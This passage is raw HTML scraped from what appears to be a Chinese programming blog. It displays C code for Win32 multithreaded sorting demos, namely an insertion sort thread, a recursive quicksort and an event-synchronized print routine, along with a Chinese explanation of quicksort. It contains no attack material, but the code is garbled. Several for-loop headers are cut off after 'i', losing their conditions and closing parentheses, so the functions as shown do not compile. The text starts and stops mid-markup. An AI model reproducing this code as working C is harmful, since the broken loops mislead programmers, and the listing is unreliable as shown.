class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8a584225918-23\">23</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8a584225918-1\"><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">__stdcall </span><span class=\"crayon-e\">InsertSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">theArray</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8a584225918-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8a584225918-3\">　<span class=\"crayon-t\">long</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">MySafeArray*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">theArray</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8a584225918-4\">　<span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLength</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">MySafeArray*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">theArray</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">iLength</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8a584225918-5\">　<span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8a584225918-6\">　<span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8a584225918-7\">　<span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">i</span>　<span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8a584225918-8\">　　<span class=\"crayon-v\">temp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//取出序列后面无序数据的第一个元素值</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8a584225918-9\">　　<span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//和前面的有序数据逐个进行比较找出合适的插入位置</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8a584225918-10\">　　<span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8a584225918-11\">　　　<span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//如果该元素比插入值大则后移</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8a584225918-12\">　　　　<span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8a584225918-13\">　　　<span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//如果该元素比插入值小，那么该位置的后一位就是插入元素的位置</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8a584225918-14\">　　　　<span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8a584225918-15\">　　<span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8a584225918-16\">　　<span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8a584225918-17\">　<span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8a584225918-18\">　<span class=\"crayon-e\">PrintResult</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLength</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Insert Sort\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//向控制台打印排序结果</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8a584225918-19\">　<span class=\"crayon-e\">InterlockedIncrement</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">ThreadCompleted</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//返回前使线程完成数标记加1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8a584225918-20\">　<span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ThreadCompleted</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SetEvent</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">evtTerminate</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//检查是否其他线程都已执行完</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8a584225918-21\">　　<span class=\"crayon-c\">//若都执行完则设置程序结束信号量</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8a584225918-22\">　<span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8a584225918-23\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0042 seconds] -->\r\n<p>快速排序思想：快速排序是分治思想的一种应用，它先选取一个支点，然后把小于支点的元素交换到支点的前边，把大于支点的元素交换到支点的右边。然后再对支点左边部分和右边部分进行同样的处理，这样若干次之后，数据就会变得有序。下面的实现使用了递归建立两个游标：iLow，iHigh；iLow指向序列的第一个元素，iHigh指向最后一个先选第一个元素作为支点，并把它的值存贮在一个辅助变量里。那么第一个位置就变为空并可以放置其他的元素。 这样从iHigh指向的元素开始向前移动游标，iHigh查找比支点小的元素，如果找到，则把它放置到空置了的位置（现在是第一个位置），然后iHigh游标停止移动，这时iHigh指向的位置被空置，然后移动iLow游标寻找比支点大的元素放置到iHigh指向的空置的位置，如此往复直到iLow与iHigh相等。最后使用递归对左右两部分进行同样处理</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b8f186689072\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nint QuickSort(long* Array, int iLow, int iHigh)\r\n{\r\n　if(iLow &gt;= iHigh) return 1; //递归结束条件\r\n　long pivot = Array[iLow];\r\n　int iLowSaved = iLow, iHighSaved = iHigh; //保未改变的iLow，iHigh值保存起来\r\n　while (iLow &lt; iHigh)\r\n　{\r\n　　while (Array[iHigh] &gt;= pivot &amp;&amp; iHigh &gt;iLow) //寻找比支点大的元素\r\n　　　iHigh -- ;\r\n　　Array[iLow] = Array[iHigh]; //把找到的元素放置到空置的位置\r\n　　while (Array[iLow] &lt; pivot &amp;&amp; iLow &lt; iHigh) //寻找比支点小的元素\r\n　　　iLow ++ ;\r\n　　Array[iHigh] = Array[iLow]; //把找到的元素放置到空置的位置\r\n　}\r\n　Array[iLow] = pivot; //把支点值放置到支点位置，这时支点位置是空置的\r\n　//对左右部分分别进行递归处理\r\n　QuickSort(Array, iLowSaved, iHigh-1);\r\n　QuickSort(Array, iLow+1, iHighSaved);\r\n　return 0;\r\n}\r\n\r\n//每一个线程都要使用这个函数进行输出，而且只有一个显示器，产生多个线程\r\n//竞争对控制台的使用权。\r\nvoid PrintResult(long* Array, int iLength, const char* HeadStr)\r\n{\r\n　WaitForSingleObject(evtPrint, INFINITE); //等待事件有信号\r\n　//EnterCriticalSection(&amp;csPrint); //标记有线程进入临界区\r\n　//WaitForSingleObject(mtxPrint, INFINITE); //等待互斥量空置（没有线程拥有它）\r\n　int i;\r\n　printf(\"%s: \", HeadStr);\r\n　for (i=0; i　{\r\n　　printf(\"%d,\", Array[i]);\r\n　　Sleep(100); //延时（可以去掉）\r\n/*只是使得多线程对临界区访问的问题比较容易看得到\r\n如果你把临界控制的语句注释掉，输出就会变得很凌乱，各个排序的结果会\r\n分插间隔着输出，如果不延时就不容易看到这种不对临界区控制的结果\r\n*/\r\n　}\r\n　printf(\"%d\\n\", Array[i]);\r\n　SetEvent(evtPrint); //把事件信号量恢复，变为有信号\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b8f186689072-41\">41</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-1\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">QuickSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLow</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iHigh</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-3\">　<span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">iLow</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iHigh</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//递归结束条件</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-4\">　<span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pivot</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">iLow</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-5\">　<span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLowSaved</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLow</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iHighSaved</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iHigh</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//保未改变的iLow，iHigh值保存起来</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-6\">　<span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">iLow</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iHigh</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-7\">　<span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-8\">　　<span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">iHigh</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pivot</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iHigh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">iLow</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//寻找比支点大的元素</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-9\">　　　<span class=\"crayon-v\">iHigh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-10\">　　<span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">iLow</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">iHigh</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//把找到的元素放置到空置的位置</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-11\">　　<span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">iLow</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pivot</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLow</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iHigh</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//寻找比支点小的元素</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-12\">　　　<span class=\"crayon-v\">iLow</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-13\">　　<span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">iHigh</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">iLow</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//把找到的元素放置到空置的位置</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-14\">　<span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-15\">　<span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">iLow</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pivot</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//把支点值放置到支点位置，这时支点位置是空置的</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-16\">　<span class=\"crayon-c\">//对左右部分分别进行递归处理</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-17\">　<span class=\"crayon-e\">QuickSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLowSaved</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iHigh</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-18\">　<span class=\"crayon-e\">QuickSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLow</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iHighSaved</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-19\">　<span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-20\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-21\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-22\"><span class=\"crayon-c\">//每一个线程都要使用这个函数进行输出，而且只有一个显示器，产生多个线程</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-23\"><span class=\"crayon-c\">//竞争对控制台的使用权。</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-24\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">PrintResult</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLength</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">HeadStr</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b8f186689072-25\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b8f186689072-26\">　<span class=\"crayon-e\">WaitForSingleObject</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">evtPrint</span><span class=\"crayon-sy\">,</span><span 